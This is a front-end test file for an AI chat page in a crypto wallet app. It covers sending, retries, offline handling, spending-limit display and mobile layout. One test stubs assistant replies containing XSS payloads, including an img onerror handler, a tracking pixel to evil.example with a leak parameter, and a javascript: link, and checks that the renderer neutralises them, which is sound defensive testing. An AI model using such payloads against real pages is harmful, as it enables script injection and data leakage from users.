import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { cleanup, screen, waitFor, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { resetClientForTests } from '../api/client'
import type { ChatMessage, Contact, WalletState } from '../api/types'
import { routes } from '../routes'
import { makeWalletState, SEPOLIA } from '../test/fixtures'
import { json, ME, renderRoutes, setViewportWidth, TOKEN, WALLET } from '../test/utils'

const CHAINS = [{ chain_id: SEPOLIA, name: 'sepolia', native_ticker: 'ETH', fork: false }]
const SAM: Contact = { name: 'sam', address: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8' }

type Answer = { reply: string } | { status: number; detail?: string } | 'offline'

interface ServerOptions {
  history?: ChatMessage[]
  /** GET /api/chat/history fails this many times first. */
  historyFailures?: number
  /** POST /api/chat answers, in order; the last one repeats. Default: an echo. */
  answers?: Answer[]
  /** POST /api/chat waits for this before answering. */
  gate?: Promise<void>
  /** Whether the server keeps a message it answered with an error (it had started the turn). */
  keepsFailed?: boolean
  wallet?: WalletState
  /** Every GET /api/wallet read after the first fails. */
  walletFailsLater?: boolean
  walletChains?: number[]
  contacts?: Contact[]
}

/** A signed-in account with a wallet on Sepolia and a chat that behaves like app/api.py. */
function stubServer({
  history = [],
  historyFailures = 0,
  answers = [],
  gate = Promise.resolve(),
  keepsFailed = false,
  wallet = makeWalletState(),
  walletFailsLater = false,
  walletChains = [SEPOLIA],
  contacts = [SAM],
}: ServerOptions = {}) {
  let thread = [...history]
  const posted: unknown[] = []
  const calls = { history: 0, wallet: 0 }
  vi.stubGlobal(
    'fetch',
    vi.fn((url: string, init?: RequestInit) => {
      const method = init?.method ?? 'GET'
      if (url === '/api/auth/refresh') return Promise.resolve(json(200, TOKEN))
      if (url === '/api/me') return Promise.resolve(json(200, { ...ME, owner_addr: WALLET, wallet_chains: walletChains }))
      if (url === '/api/chains') return Promise.resolve(json(200, { chains: CHAINS }))
      if (url === '/api/contacts') return Promise.resolve(json(200, { contacts }))
      if (url === `/api/wallet/${SEPOLIA}`) {
        calls.wallet++
        if (walletFailsLater && calls.wallet > 1) return Promise.resolve(json(502, { detail: 'RPC unavailable' }))
        return Promise.resolve(json(200, wallet))
      }
      if (url.startsWith('/api/chat/history?')) {
        calls.history++
        if (historyFailures-- > 0) return Promise.resolve(new Response('Internal Server Error', { status: 500 }))
        return Promise.resolve(json(200, { chain_id: SEPOLIA, messages: thread }))
      }
      if (url === '/api/chat' && method === 'POST') {
        const body = JSON.parse(String(init?.body)) as { chain_id: number; message: string }
        const answer = answers.length ? answers[Math.min(posted.length, answers.length - 1)] : null
        posted.push(body)
        return gate.then(() => {
          if (answer === 'offline') {
            if (keepsFailed) thread = [...thread, { role: 'user', text: body.message }]
            throw new TypeError('Failed to fetch')
          }
          if (answer && 'status' in answer) {
            if (keepsFailed) thread = [...thread, { role: 'user', text: body.message }]
            return answer.detail
              ? json(answer.status, { detail: answer.detail })
              : new Response('Bad Gateway', { status: answer.status })
          }
          const reply = answer?.reply ?? `You said: ${body.message}`
          thread = [...thread, { role: 'user', text: body.message }, { role: 'assistant', text: reply }]
          return json(200, { reply })
        })
      }
      return Promise.resolve(json(404, { detail: 'Not Found' }))
    }),
  )
  return { posted, calls }
}

function composer() {
  return screen.findByRole('textbox', { name: 'Message' })
}

function log() {
  return screen.getByRole('log', { name: 'Conversation with Mitfah' })
}

function deferred() {
  let open!: () => void
  const promise = new Promise<void>(resolve => {
    open = resolve
  })
  return { promise, open }
}

describe('AssistantPage', () => {
  beforeEach(() => {
    resetClientForTests()
    setViewportWidth(1280)
    ;(window as { coarsePointer?: boolean }).coarsePointer = false
  })
  afterEach(() => {
    cleanup()
    vi.unstubAllGlobals()
  })

  it('shows the conversation, with replies as formatted text that runs nothing', async () => {
    stubServer({
      history: [
        { role: 'user', text: 'what can I spend?' },
        {
          role: 'assistant',
          text: [
            'You have **$60** left. See [the docs](https://example.com/docs).',
            '<img src=x onerror="alert(1)"> ![tracker](https://evil.example/pixel?leak=1)',
            '[click](javascript:alert(1))',
            '| Token | Amount |\n| --- | --- |\n| USDC | 25 |',
          ].join('\n\n'),
        },
      ],
    })
    await renderRoutes(routes, '/assistant')

    expect(await screen.findByText('what can I spend?')).toBeInTheDocument()
    expect(screen.getByRole('heading', { name: 'Assistant', level: 1 })).toBeInTheDocument()
    const conversation = log()
    expect(within(conversation).getByText('You said:')).toBeInTheDocument()
    expect(within(conversation).getByText('Mitfah said:')).toBeInTheDocument()
    expect(within(conversation).getByText('$60').tagName).toBe('STRONG')
    const docs = within(conversation).getByRole('link', { name: 'the docs' })
    expect(docs).toHaveAttribute('href', 'https://example.com/docs')
    expect(docs).toHaveAttribute('target', '_blank')
    expect(docs).toHaveAttribute('rel', 'noopener noreferrer')
    // Raw HTML shows as text; images never load; a javascript: link loses its target.
    expect(conversation.querySelector('img')).toBeNull()
    expect(within(conversation).getByText('[image: tracker]')).toBeInTheDocument()
    expect(within(conversation).getByText('click').getAttribute('href') ?? '').not.toContain('javascript')
    expect(within(conversation).getByRole('table')).toBeInTheDocument()
    // No starting suggestions once there's a conversation.
    expect(screen.queryByRole('list', { name: 'Suggestions' })).not.toBeInTheDocument()
  })

  it('shows what the assistant can spend and whom it can pay beside the chat', async () => {
    stubServer({ contacts: [SAM, { name: 'alex', address: '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC' }] })
    await renderRoutes(routes, '/assistant')

    const aside = await screen.findByRole('complementary', { name: 'What the assistant can do' })
    expect(within(aside).getByText('$60.00')).toBeInTheDocument()
    expect(within(aside).getByText('of $100.00')).toBeInTheDocument()
    expect(within(aside).getByRole('progressbar', { name: '60% of the limit left' })).toBeInTheDocument()
    expect(within(aside).getByText(/^Resets in/)).toBeInTheDocument()
    expect(await within(aside).findByText('alex')).toBeInTheDocument()
    expect(within(aside).getByText('sam')).toBeInTheDocument()
    expect(within(aside).getByRole('link', { name: 'Manage contacts' })).toHaveAttribute('href', '/contacts')
  })

  it('sends on Enter, shows the message at once, and waits for the reply', async () => {
    const reply = deferred()
    const { posted, calls } = stubServer({ answers: [{ reply: 'You have 1.5 ETH.' }], gate: reply.promise })
    const user = userEvent.setup()
    await renderRoutes(routes, '/assistant')

    const input = await composer()
    await waitFor(() => expect(calls.wallet).toBe(1))
    await user.type(input, "  what's my balance?  {Enter}")

    expect(posted).toEqual([{ chain_id: SEPOLIA, message: "what's my balance?" }])
    expect(within(log()).getByText("what's my balance?")).toBeInTheDocument()
    expect(screen.getByRole('status')).toHaveTextContent('Mitfah is working… This can take up to a minute.')
    expect(input).toHaveValue('')
    expect(input).toHaveFocus()
    // The next message can be typed, not sent.
    await user.type(input, 'and my limit?')
    expect(screen.getByRole('button', { name: 'Send' })).toBeDisabled()
    await user.keyboard('{Enter}')
    expect(posted).toHaveLength(1)

    reply.open()
    expect(await within(log()).findByText('You have 1.5 ETH.')).toBeInTheDocument()
    expect(screen.queryByText(/Mitfah is working/)).not.toBeInTheDocument()
    expect(screen.getByRole('button', { name: 'Send' })).toBeEnabled()
    expect(within(log()).getAllByText("what's my balance?")).toHaveLength(1)
    // The conversation and the wallet (a payment changes what's left) are read again.
    await waitFor(() => expect(calls.history).toBe(2))
    await waitFor(() => expect(calls.wallet).toBe(2))
    expect(input).toHaveValue('and my limit?')
  })

  it('keeps the chat, and what is being typed, when a wallet refresh fails', async () => {
    const { calls } = stubServer({ walletFailsLater: true })
    const user = userEvent.setup()
    await renderRoutes(routes, '/assistant')

    const input = await composer()
    await user.type(input, 'hello{Enter}')
    await user.type(input, 'half-typed')
    expect(await within(log()).findByText('You said: hello')).toBeInTheDocument()
    // The reply makes the page read the wallet again, and that read fails.
    await waitFor(() => expect(calls.wallet).toBe(2))
    await new Promise(resolve => setTimeout(resolve, 50))
    expect(screen.queryByText(/Couldn't load your wallet/)).not.toBeInTheDocument()
    expect(await composer()).toHaveValue('half-typed')
    expect(screen.getByRole('complementary', { name: 'What the assistant can do' })).toBeInTheDocument()
  })

  it('starts a new line with Shift+Enter', async () => {
    const { posted } = stubServer()
    const user = userEvent.setup()
    await renderRoutes(routes, '/assistant')

    const input = await composer()
    await user.type(input, 'line one{Shift>}{Enter}{/Shift}line two')
    expect(input).toHaveValue('line one\nline two')
    expect(posted).toHaveLength(0)
    await user.click(screen.getByRole('button', { name: 'Send' }))
    expect(posted).toEqual([{ chain_id: SEPOLIA, message: 'line one\nline two' }])
    expect(await within(log()).findByText('You said: line one line two', { normalizer: s => s.replace(/\s+/g, ' ') })).toBeInTheDocument()
  })

  it('makes Enter a new line on a touch screen, where the button sends', async () => {
    ;(window as { coarsePointer?: boolean }).coarsePointer = true
    const { posted } = stubServer()
    const user = userEvent.setup()
    await renderRoutes(routes, '/assistant')

    const input = await composer()
    await user.type(input, 'one{Enter}two')
    expect(input).toHaveValue('one\ntwo')
    expect(posted).toHaveLength(0)
  })

  it('does not send a word still being composed with an input method', async () => {
    const { posted } = stubServer()
    const user = userEvent.setup()
    await renderRoutes(routes, '/assistant')

    const input = await composer()
    await user.type(input, 'こんにちは')
    input.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', keyCode: 229, bubbles: true, cancelable: true }))
    expect(posted).toHaveLength(0)
  })

  it('never sends a blank or over-long message', async () => {
    const { posted } = stubServer()
    const user = userEvent.setup()
    await renderRoutes(routes, '/assistant')

    const input = await composer()
    await user.type(input, '   {Enter}')
    expect(posted).toHaveLength(0)
    expect(screen.getByRole('button', { name: 'Send' })).toBeDisabled()

    await user.clear(input)
    await user.paste('x'.repeat(4_001))
    expect(screen.getByText('4,001 / 4,000 — too long to send')).toBeInTheDocument()
    expect(input).toHaveAttribute('aria-invalid', 'true')
    expect(screen.getByRole('button', { name: 'Send' })).toBeDisabled()
    await user.keyboard('{Enter}')
    expect(posted).toHaveLength(0)
  })

  it('offers questions to start with, and drafts a payment without sending it', async () => {
    const { posted } = stubServer()
    const user = userEvent.setup()
    await renderRoutes(routes, '/assistant')

    const suggestions = await screen.findByRole('list', { name: 'Suggestions' })
    await user.click(await within(suggestions).findByRole('button', { name: 'Send 5 USDC to sam…' }))
    expect(posted).toHaveLength(0)
    expect(await composer()).toHaveValue('Send 5 USDC to sam')
    expect(await composer()).toHaveFocus()

    await user.click(within(suggestions).getByRole('button', { name: 'What’s in my wallet?' }))
    expect(posted).toEqual([{ chain_id: SEPOLIA, message: 'What’s in my wallet?' }])
    expect(await within(log()).findByText('You said: What’s in my wallet?')).toBeInTheDocument()
    expect(screen.queryByRole('list', { name: 'Suggestions' })).not.toBeInTheDocument()
  })

  it('leaves out the payment suggestion when there is no one to pay', async () => {
    stubServer({ contacts: [] })
    await renderRoutes(routes, '/assistant')

    const suggestions = await screen.findByRole('list', { name: 'Suggestions' })
    expect(within(suggestions).getAllByRole('button')).toHaveLength(3)
    expect(await screen.findByText('No one yet. Add a contact before asking it to pay someone.')).toBeInTheDocument()
  })

  it('offers to send again when the server refused the message', async () => {
    const { posted } = stubServer({
      answers: [{ status: 422, detail: 'String should have at most 4000 characters' }, { reply: 'Hello!' }],
    })
    const user = userEvent.setup()
    await renderRoutes(routes, '/assistant')

    await user.type(await composer(), 'hello{Enter}')
    expect(await screen.findByText('Not sent.')).toBeInTheDocument()
    expect(screen.getByText('String should have at most 4000 characters')).toBeInTheDocument()
    expect(within(log()).getByText('hello')).toBeInTheDocument()

    await user.click(screen.getByRole('button', { name: 'Try again' }))
    expect(await within(log()).findByText('Hello!')).toBeInTheDocument()
    expect(screen.queryByText('Not sent.')).not.toBeInTheDocument()
    expect(posted).toHaveLength(2)
  })

  it('puts a refused message back in the composer to edit', async () => {
    const { posted } = stubServer({ answers: [{ status: 400, detail: 'Unsupported chain ID: 11155111' }] })
    const user = userEvent.setup()
    await renderRoutes(routes, '/assistant')

    await user.type(await composer(), 'hello{Enter}')
    await user.click(await screen.findByRole('button', { name: 'Edit message' }))
    expect(await composer()).toHaveValue('hello')
    expect(await composer()).toHaveFocus()
    expect(screen.queryByText('Not sent.')).not.toBeInTheDocument()
    expect(within(log()).queryByText('hello')).not.toBeInTheDocument()
    expect(posted).toHaveLength(1)
  })

  it('never offers to resend a message that may have reached the assistant, and gives it back only if it did not', async () => {
    const { posted } = stubServer({ answers: ['offline'] })
    const user = userEvent.setup()
    await renderRoutes(routes, '/assistant')

    await user.type(await composer(), 'send 5 usdc to sam{Enter}')
    expect(await screen.findByText('No reply arrived.')).toBeInTheDocument()
    expect(screen.getByText(/may still have handled your message/)).toBeInTheDocument()
    expect(screen.queryByRole('button', { name: 'Try again' })).not.toBeInTheDocument()

    await user.click(screen.getByRole('button', { name: 'Check for a reply' }))
    // Not on the server, so it comes back to send on purpose.
    await waitFor(async () => expect(await composer()).toHaveValue('send 5 usdc to sam'))
    expect(screen.queryByText('No reply arrived.')).not.toBeInTheDocument()
    expect(posted).toHaveLength(1)
  })

  it('shows a message the server kept after the connection dropped, without giving it back', async () => {
    const { posted, calls } = stubServer({ answers: [{ status: 502 }], keepsFailed: true })
    const user = userEvent.setup()
    await renderRoutes(routes, '/assistant')

    await user.type(await composer(), 'send 5 usdc to sam{Enter}')
    expect(await screen.findByText('No reply arrived.')).toBeInTheDocument()
    await user.click(screen.getByRole('button', { name: 'Check for a reply' }))

    await waitFor(() => expect(calls.history).toBe(2))
    expect(await screen.findByText(/No reply to this yet/)).toBeInTheDocument()
    expect(within(log()).getAllByText('send 5 usdc to sam')).toHaveLength(1)
    expect(await composer()).toHaveValue('')
    await user.click(screen.getByRole('button', { name: 'Check again' }))
    await waitFor(() => expect(calls.history).toBe(3))
    expect(posted).toHaveLength(1)
  })

  it('keeps waiting after the page is left and come back to, and still allows one message at a time', async () => {
    const reply = deferred()
    const { posted } = stubServer({ gate: reply.promise })
    const user = userEvent.setup()
    const router = await renderRoutes(routes, '/assistant')

    await user.type(await composer(), 'first{Enter}')
    expect(await screen.findByText(/Mitfah is working/)).toBeInTheDocument()

    await router.navigate('/contacts')
    expect(await screen.findByRole('heading', { name: 'Contacts', level: 1 })).toBeInTheDocument()
    await router.navigate('/assistant')

    expect(await screen.findByText(/Mitfah is working/)).toBeInTheDocument()
    expect(within(log()).getByText('first')).toBeInTheDocument()
    await user.type(await composer(), 'second{Enter}')
    expect(posted).toHaveLength(1)

    reply.open()
    expect(await within(log()).findByText('You said: first')).toBeInTheDocument()
    expect(within(log()).getAllByText('first')).toHaveLength(1)
  })

  it('says why the assistant cannot send while the wallet is paused or it is turned off', async () => {
    stubServer({ wallet: makeWalletState({ paused: true }) })
    await renderRoutes(routes, '/assistant')
    expect(
      await screen.findByText('Your wallet is paused, so the assistant can answer questions but can’t send anything.'),
    ).toBeInTheDocument()
    expect(screen.getByRole('link', { name: 'Open Controls' })).toHaveAttribute('href', '/controls')
    cleanup()

    stubServer({ wallet: makeWalletState({ session: { key: null, active: false }, is_owner: false }) })
    await renderRoutes(routes, '/assistant')
    expect(
      await screen.findByText('The assistant is turned off, so it can answer questions but can’t send anything.'),
    ).toBeInTheDocument()
    expect(screen.queryByRole('link', { name: 'Open Controls' })).not.toBeInTheDocument()
  })

  it('warns in red when nothing caps what the assistant can spend', async () => {
    const spending = { ...makeWalletState().spending, hook_installed: false, daily_limit_usd: 0, remaining_usd: 0 }
    stubServer({ wallet: makeWalletState({ spending }) })
    await renderRoutes(routes, '/assistant')

    const notice = (await screen.findByText(/nothing caps what the assistant can spend/)).closest('.rs-message')
    expect(notice).toHaveClass('rs-message-error')
    const aside = screen.getByRole('complementary', { name: 'What the assistant can do' })
    expect(within(aside).getByText('No limit')).toBeInTheDocument()
    expect(within(aside).queryByRole('progressbar')).not.toBeInTheDocument()
    expect(within(aside).queryByText('$0.00')).not.toBeInTheDocument()
    cleanup()

    setViewportWidth(390)
    stubServer({ wallet: makeWalletState({ spending }) })
    await renderRoutes(routes, '/assistant')
    expect(await screen.findByText('No spending limit')).toBeInTheDocument()
  })

  it('asks for a wallet first when there is none', async () => {
    stubServer({ walletChains: [] })
    await renderRoutes(routes, '/assistant')
    expect(await screen.findByRole('heading', { name: 'Create your wallet' })).toBeInTheDocument()
    expect(screen.queryByRole('textbox', { name: 'Message' })).not.toBeInTheDocument()
  })

  it('offers a retry when the conversation fails to load, and can still send', async () => {
    const { posted } = stubServer({ historyFailures: 1 })
    const user = userEvent.setup()
    await renderRoutes(routes, '/assistant')

    expect(await screen.findByText(/Couldn't load the conversation/)).toBeInTheDocument()
    await user.type(await composer(), 'hi{Enter}')
    expect(posted).toHaveLength(1)
    expect(await within(log()).findByText('You said: hi')).toBeInTheDocument()
    expect(screen.queryByText(/Couldn't load the conversation/)).not.toBeInTheDocument()
  })

  it('lets the keyboard shrink the page only while the chat is open', async () => {
    const meta = document.createElement('meta')
    meta.name = 'viewport'
    meta.content = 'width=device-width, initial-scale=1.0'
    document.head.append(meta)
    try {
      stubServer()
      const router = await renderRoutes(routes, '/assistant')
      await composer()
      expect(meta.content).toBe('width=device-width, initial-scale=1.0, interactive-widget=resizes-content')

      await router.navigate('/contacts')
      expect(await screen.findByRole('heading', { name: 'Contacts', level: 1 })).toBeInTheDocument()
      expect(meta.content).toBe('width=device-width, initial-scale=1.0')
    } finally {
      meta.remove()
    }
  })

  it('fits a phone: one summary line instead of the side panel, and an icon send button', async () => {
    setViewportWidth(390)
    stubServer()
    await renderRoutes(routes, '/assistant')

    expect(await screen.findByRole('link', { name: '1 contact' })).toHaveAttribute('href', '/contacts')
    expect(screen.getByText('$60.00').closest('p')).toHaveTextContent('$60.00 of $100.00 left')
    expect(screen.queryByRole('complementary', { name: 'What the assistant can do' })).not.toBeInTheDocument()
    const send = screen.getByRole('button', { name: 'Send' })
    expect(send).not.toHaveTextContent('Send')
  })
})
